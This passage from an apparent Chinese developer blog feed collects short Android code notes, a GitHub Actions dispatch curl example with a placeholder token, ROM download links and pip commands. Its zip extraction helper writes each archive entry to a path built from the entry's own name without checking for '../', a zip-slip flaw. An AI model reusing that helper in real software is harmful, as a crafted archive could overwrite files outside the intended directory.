rightTopHypotenuse),</span><br><span class="line">                Math.<span class="built_in">max</span>(leftBottomHypotenuse, rightBottomHypotenuse));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加到根视图</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">attachToRootView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        setLayoutParams(<span class="keyword">new</span> ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));</span><br><span class="line">        mRootView.addView(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从根视图中移除并释放资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">detachFromRootView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mRootView != null) &#123;</span><br><span class="line">            mRootView.removeView(<span class="keyword">this</span>);</span><br><span class="line">            mRootView = null;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (mBackground != null) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!mBackground.isRecycled()) &#123;</span><br><span class="line">                mBackground.recycle();</span><br><span class="line">            &#125;</span><br><span class="line">            mBackground = null;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (mPaint != null) &#123;</span><br><span class="line">            mPaint = null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新屏幕截图</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">updateBackground</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mBackground != null &amp;&amp; !mBackground.isRecycled()) &#123;</span><br><span class="line">            mBackground.recycle();</span><br><span class="line">        &#125;</span><br><span class="line">        mBackground = getBitmapFromView(mRootView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 由canvas更新背景截图（drawingCache已废弃）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Bitmap <span class="title">getBitmapFromView</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        view.measure(MeasureSpec.makeMeasureSpec(view.getLayoutParams().<span class="built_in">width</span>, MeasureSpec.EXACTLY),</span><br><span class="line">                MeasureSpec.makeMeasureSpec(view.getLayoutParams().<span class="built_in">height</span>, MeasureSpec.EXACTLY));</span><br><span class="line">        Bitmap bitmap = Bitmap.createBitmap(view.getWidth(), view.getHeight(), Bitmap.Config.ARGB_8888);</span><br><span class="line">        Canvas canvas = <span class="keyword">new</span> Canvas(bitmap);</span><br><span class="line">        view.draw(canvas);</span><br><span class="line">        <span class="keyword">return</span> bitmap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取view在屏幕中的绝对x坐标</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">float</span> <span class="title">getAbsoluteX</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">float</span> x = view.getX();</span><br><span class="line">        ViewParent parent = view.getParent();</span><br><span class="line">        <span class="keyword">if</span> (parent instanceof View) &#123;</span><br><span class="line">            x += getAbsoluteX((View) parent);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取view在屏幕中的绝对y坐标</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">float</span> <span class="title">getAbsoluteY</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">float</span> y = view.getY();</span><br><span class="line">        ViewParent parent = view.getParent();</span><br><span class="line">        <span class="keyword">if</span> (parent instanceof View) &#123;</span><br><span class="line">            y += getAbsoluteY((View) parent);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onDraw</span><span class="params">(Canvas canvas)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//在新的图层上面绘制</span></span><br><span class="line">        <span class="keyword">int</span> layer;</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) &#123;</span><br><span class="line">            layer = canvas.saveLayer(<span class="number">0</span>, <span class="number">0</span>, getWidth(), getHeight(), null);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            layer = canvas.saveLayer(<span class="number">0</span>, <span class="number">0</span>, getWidth(), getHeight(), null, Canvas.ALL_SAVE_FLAG);</span><br><span class="line">        &#125;</span><br><span class="line">        canvas.drawBitmap(mBackground, <span class="number">0</span>, <span class="number">0</span>, null);</span><br><span class="line">        canvas.drawCircle(mStartX, mStartY, mCurrentRadius, mPaint);</span><br><span class="line">        canvas.restoreToCount(layer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ValueAnimator <span class="title">getAnimator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ValueAnimator valueAnimator = ValueAnimator.ofFloat(<span class="number">0</span>, mMaxRadius).setDuration(mDuration);</span><br><span class="line">        valueAnimator.addUpdateListener(mAnimatorUpdateListener);</span><br><span class="line">        valueAnimator.addListener(mAnimatorListener);</span><br><span class="line">        <span class="keyword">return</span> valueAnimator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置动画结束监听器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RippleAnimation <span class="title">setOnAnimationEndListener</span><span class="params">(OnAnimationEndListener listener)</span> </span>&#123;</span><br><span class="line">        mOnAnimationEndListener = listener;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @SuppressLint(<span class="string">"ClickableViewAccessibility"</span>)</span><br><span class="line">    @Override</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onTouchEvent</span><span class="params">(MotionEvent event)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> interface OnAnimationEndListener &#123;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">onAnimationEnd</span><span class="params">()</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Context转Activity</title>
      <link href="/2022/context-zhuan-activity/"/>
      <url>/2022/context-zhuan-activity/</url>
      
        <content type="html"><![CDATA[<p>某些地方需要使用Activity而不是Context，可以用这个转换  </p><a id="more"></a>  <figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function">Activity <span class="title">scanForActivity</span><span class="params">(Context cont)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (cont == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cont <span class="keyword">instanceof</span> Activity)</span><br><span class="line">        <span class="keyword">return</span> (Activity)cont;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (cont <span class="keyword">instanceof</span> ContextWrapper)</span><br><span class="line">        <span class="keyword">return</span> scanForActivity(((ContextWrapper)cont).getBaseContext());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>转载自 <a href="https://blog.csdn.net/LoveShadowing/article/details/103562959" target="_blank" rel="noopener">https://blog.csdn.net/LoveShadowing/article/details/103562959</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>获取屏幕宽高</title>
      <link href="/2022/huo-qu-ping-mu-kuan-gao/"/>
      <url>/2022/huo-qu-ping-mu-kuan-gao/</url>
      
        <content type="html"><![CDATA[<p>获取屏幕宽高  </p><a id="more"></a>  <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">public</span> <span class="type">int</span> getSCRW()&#123;</span><br><span class="line">    WindowManager windowManager = getWindow().getWindowManager();</span><br><span class="line">    <span class="type">Point</span> <span class="type">point</span> = <span class="built_in">new</span> <span class="type">Point</span>();</span><br><span class="line">    windowManager.getDefaultDisplay().getRealSize(<span class="type">point</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="type">point</span>.x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">public</span> <span class="type">int</span> getSCRH()&#123;</span><br><span class="line">    WindowManager windowManager = getWindow().getWindowManager();</span><br><span class="line">    <span class="type">Point</span> <span class="type">point</span> = <span class="built_in">new</span> <span class="type">Point</span>();</span><br><span class="line">    windowManager.getDefaultDisplay().getRealSize(<span class="type">point</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="type">point</span>.y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>屏幕宽SCRW，屏幕高SCRH，按mpc习惯写的，习惯了好记</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>代码中设置view大小</title>
      <link href="/2022/dai-ma-zhong-she-zhi-view-da-xiao/"/>
      <url>/2022/dai-ma-zhong-she-zhi-view-da-xiao/</url>
      
        <content type="html"><![CDATA[<p>代码中设置view大小</p><a id="more"></a>  <figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> width = <span class="number">240</span>;</span><br><span class="line"><span class="built_in">int</span> height = <span class="number">320</span>;</span><br><span class="line">LinearLayout.LayoutParams layoutParams = <span class="keyword">new</span> LinearLayout.<span class="constructor">LayoutParams(<span class="params">width</span>,<span class="params">height</span>)</span>;</span><br><span class="line">view.set<span class="constructor">LayoutParams(<span class="params">layoutParams</span>)</span>;</span><br></pre></td></tr></table></figure><p>ImageView/TextView可用</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>unzip Javazip解压</title>
      <link href="/2022/unzip-javazip-jie-ya/"/>
      <url>/2022/unzip-javazip-jie-ya/</url>
      
        <content type="html"><![CDATA[<p>记录一个zip解压类，方便快速使用  </p><a id="more"></a>  <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.<span class="built_in">File</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Unzip</span> &#123;</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解压assets的zip压缩文件到指定目录</span></span><br><span class="line"><span class="comment">     * @param context 上下文对象</span></span><br><span class="line"><span class="comment">     * @param assetName 压缩文件名</span></span><br><span class="line"><span class="comment">     * @param outputDirectory 输出目录</span></span><br><span class="line"><span class="comment">     * @param isReWrite 是否覆盖</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unZip</span><span class="params">(Context context, <span class="keyword">String</span> assetName, <span class="keyword">String</span> outputDirectory, <span class="keyword">boolean</span> isReWrite)</span> throws IOException </span>&#123;</span><br><span class="line">        unZip(context.getAssets().<span class="built_in">open</span>(assetName),outputDirectory,isReWrite);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解压uri的zip压缩文件到指定目录</span></span><br><span class="line"><span class="comment">     * @param context 上下文对象</span></span><br><span class="line"><span class="comment">     * @param uri 压缩文件Uri</span></span><br><span class="line"><span class="comment">     * @param outputDirectory 输出目录</span></span><br><span class="line"><span class="comment">     * @param isReWrite 是否覆盖</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unZip</span><span class="params">(Context context, Uri uri, <span class="keyword">String</span> outputDirectory, <span class="keyword">boolean</span> isReWrite)</span> throws IOException </span>&#123;</span><br><span class="line">        unZip(context.getContentResolver().openInputStream(uri),outputDirectory,isReWrite);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 解压压缩文件到指定目录</span></span><br><span class="line"><span class="comment">     * @param zipFile 压缩文件</span></span><br><span class="line"><span class="comment">     * @param outputDirectory 输出目录</span></span><br><span class="line"><span class="comment">     * @param isReWrite 是否覆盖</span></span><br><span class="line"><span class="comment">     * @throws IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unZip</span><span class="params">(<span class="built_in">File</span> zipFile, <span class="keyword">String</span> outputDirectory, <span class="keyword">boolean</span> isReWrite)</span> throws IOException </span>&#123;</span><br><span class="line">        unZip(<span class="keyword">new</span> FileInputStream(zipFile),outputDirectory,isReWrite);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unZip</span><span class="params">(InputStream inputStream, <span class="keyword">String</span> outputDirectory, <span class="keyword">boolean</span> isReWrite)</span> throws IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 创建解压目标目录</span></span><br><span class="line">        <span class="built_in">File</span> file = <span class="keyword">new</span> <span class="built_in">File</span>(outputDirectory);</span><br><span class="line">        <span class="comment">// 如果目标目录不存在，则创建</span></span><br><span class="line">        <span class="keyword">if</span> (!file.<span class="built_in">exists</span>()) &#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 打开压缩文件</span></span><br><span class="line">        ZipInputStream zipInputStream = <span class="keyword">new</span> ZipInputStream(inputStream);</span><br><span class="line">        <span class="comment">// 读取一个进入点</span></span><br><span class="line">        ZipEntry zipEntry = zipInputStream.getNextEntry();</span><br><span class="line">        <span class="comment">// 使用1Mbuffer</span></span><br><span class="line">        <span class="keyword">byte</span>[] <span class="built_in">buffer</span> = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line">        <span class="comment">// 解压时字节计数</span></span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 如果进入点为空说明已经遍历完所有压缩包中文件和目录</span></span><br><span class="line">        <span class="keyword">while</span> (zipEntry != null) &#123;</span><br><span class="line">            <span class="comment">// 如果是一个目录</span></span><br><span class="line">            <span class="keyword">if</span> (zipEntry.<span class="built_in">isDirectory</span>()) &#123;</span><br><span class="line">                file = <span class="keyword">new</span> <span class="built_in">File</span>(outputDirectory + <span class="built_in">File</span>.separator + zipEntry.getName());</span><br><span class="line">                <span class="comment">// 文件需要覆盖或者是文件不存在</span></span><br><span class="line">                <span class="keyword">if</span> (isReWrite || !file.<span class="built_in">exists</span>()) &#123;</span><br><span class="line">                    file.<span class="built_in">mkdir</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 如果是文件</span></span><br><span class="line">                file = <span class="keyword">new</span> <span class="built_in">File</span>(outputDirectory + <span class="built_in">File</span>.separator + zipEntry.getName());</span><br><span class="line">                <span class="comment">// 文件需要覆盖或者文件不存在，则解压文件</span></span><br><span class="line">                <span class="keyword">if</span> (isReWrite || !file.<span class="built_in">exists</span>()) &#123;</span><br><span class="line">                    file.createNewFile();</span><br><span class="line">                    FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">                    <span class="keyword">while</span> ((count = zipInputStream.<span class="built_in">read</span>(<span class="built_in">buffer</span>)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        fileOutputStream.<span class="built_in">write</span>(<span class="built_in">buffer</span>, <span class="number">0</span>, count);</span><br><span class="line">                    &#125;</span><br><span class="line">                    fileOutputStream.<span class="built_in">close</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 定位到下一个文件入口</span></span><br><span class="line">            zipEntry = zipInputStream.getNextEntry();</span><br><span class="line">        &#125;</span><br><span class="line">        zipInputStream.<span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>远程触发GithubAction</title>
      <link href="/2022/yuan-cheng-hong-fa-githubaction/"/>
      <url>/2022/yuan-cheng-hong-fa-githubaction/</url>
      
        <content type="html"><![CDATA[<p>使用Github的API 远程触发Github Action<br><a href="https://docs.github.com/cn/actions/using-workflows/events-that-trigger-workflows#repository_dispatch" target="_blank" rel="noopener">https://docs.github.com/cn/actions/using-workflows/events-that-trigger-workflows#repository_dispatch</a>  </p><a id="more"></a>  <p>在仓库 <code>.github/workflows/deploy.yml</code> 里添加 <code>repository_dispatch:</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># master branch on push, auto run</span></span><br><span class="line"><span class="attr">on:</span> </span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">  <span class="attr">repository_dispatch:</span></span><br><span class="line">      </span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span> </span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-18.04</span></span><br></pre></td></tr></table></figure><p>创建一个带repo权限的personal access token<br>访问<a href="https://github.com/settings/tokens/new" target="_blank" rel="noopener">https://github.com/settings/tokens/new</a> 创建token，需要勾选repo权限</p><p>API调用方法</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="symbol">https:</span>/<span class="regexp">/api.github.com/repos</span><span class="regexp">/:owner/</span><span class="symbol">:repo/dispatches</span> \</span><br><span class="line">    -H <span class="string">"Accept: application/vnd.github.everest-preview+json"</span> \</span><br><span class="line">    -H <span class="string">"Authorization: token TRIGGER_TOKEN"</span> \</span><br><span class="line">    --data <span class="string">'&#123;"event_type": "TRIGGER_EVENT"&#125;'</span></span><br></pre></td></tr></table></figure><p>其中，owner 是用户名，repo 是仓库名， TRIGGER_TOKEN 是上面申请带repo权限的 token，TRIGGER_EVENT 是自定义的事件名</p><p>调用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST https:<span class="regexp">//</span>api.github.com<span class="regexp">/repos/g</span>ddhy<span class="regexp">/MrpStore-Web/</span>dispatches \</span><br><span class="line">    -H <span class="string">"Accept: application/vnd.github.everest-preview+json"</span> \</span><br><span class="line">    -H <span class="string">"Authorization: token ghp_xxxxxxxxxxxxxxxxxxxxxxxxxx"</span> \</span><br><span class="line">    --data <span class="string">'&#123;"event_type": "更新图标"&#125;'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>弹出菜单PopupMenu</title>
      <link href="/2022/dan-chu-cai-dan-popupmenu/"/>
      <url>/2022/dan-chu-cai-dan-popupmenu/</url>
      
        <content type="html"><![CDATA[<p>View 显示PopupMenu的位置<br>菜单可以以xml的形式储存在res/menu  </p><a id="more"></a><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">void</span> <span class="title">showPopupMenu</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">final</span> PopupMenu popupMenu = <span class="keyword">new</span> PopupMenu(<span class="keyword">this</span>,v);</span><br><span class="line">        popupMenu.getMenuInflater().inflate(R.menu.main_menu,popupMenu.getMenu());</span><br><span class="line">        popupMenu.setOnMenuItemClickListener(<span class="keyword">new</span> PopupMenu.OnMenuItemClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">onMenuItemClick</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">switch</span> (item.getItemId())&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        popupMenu.setOnDismissListener(<span class="keyword">new</span> PopupMenu.OnDismissListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">onDismiss</span><span class="params">(PopupMenu menu)</span> </span>&#123;</span><br><span class="line">                popupMenu.dismiss();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        popupMenu.show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cloudflare中workers的例程</title>
      <link href="/2022/cloudflare-zhong-workers-de-li-cheng/"/>
      <url>/2022/cloudflare-zhong-workers-de-li-cheng/</url>
      
        <content type="html"><![CDATA[<p><a href="https://developers.cloudflare.com/workers/examples/" target="_blank" rel="noopener">https://developers.cloudflare.com/workers/examples/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>小米官方ROM下载</title>
      <link href="/2022/xiao-mi-guan-fang-rom-xia-zai/"/>
      <url>/2022/xiao-mi-guan-fang-rom-xia-zai/</url>
      
        <content type="html"><![CDATA[<p><a href="https://roms.miuier.com/" target="_blank" rel="noopener">MIUI官方ROM仓库 来自酷安@海力力</a></p><a id="more"></a><p><a href="https://github.com/mooseIre/update_miui_ota/blob/master/README.md" target="_blank" rel="noopener">MIUI历史版本 来自酷安@千阙</a> （收录部分机型，仓库已不再维护）</p><p><a href="https://xiaomirom.com/" target="_blank" rel="noopener">小米ROM下载</a> （推荐）</p><p><a href="http://www.miui.com/getrom.php" target="_blank" rel="noopener">小米官网</a> 小米官网链接是旧的MIUI下载官网 <a href="http://www.miui.com/getrom.php" target="_blank" rel="noopener">http://www.miui.com/getrom.php</a> 使用http访问还能打开，使用https则会跳转到小米社区的一个MIUI ROM汇总页</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python pip相关命令</title>
      <link href="/2022/python-pip-xiang-guan-ming-ling/"/>
      <url>/2022/python-pip-xiang-guan-ming-ling/</url>
      
        <content type="html"><![CDATA[<p>记录一些常用的pip命令  </p><a id="more"></a>  <p>安装软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install PackageName</span><br></pre></td></tr></table></figure><p>卸载软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip uninstall PackageName</span><br></pre></td></tr></table></figure><p>显示已安装的软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip list</span><br></pre></td></tr></table></figure><p>检测软件包是否有更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip list -o</span><br></pre></td></tr></table></figure><p>显示软件包的详细信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip show PackageName</span><br></pre></td></tr></table></figure><p>更新软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade PackageName</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文本转语音tts</title>
      <link href="/2022/wen-ben-zhuan-yu-yin-tts/"/>
      <url>/2022/wen-ben-zhuan-yu-yin-tts/</url>
      
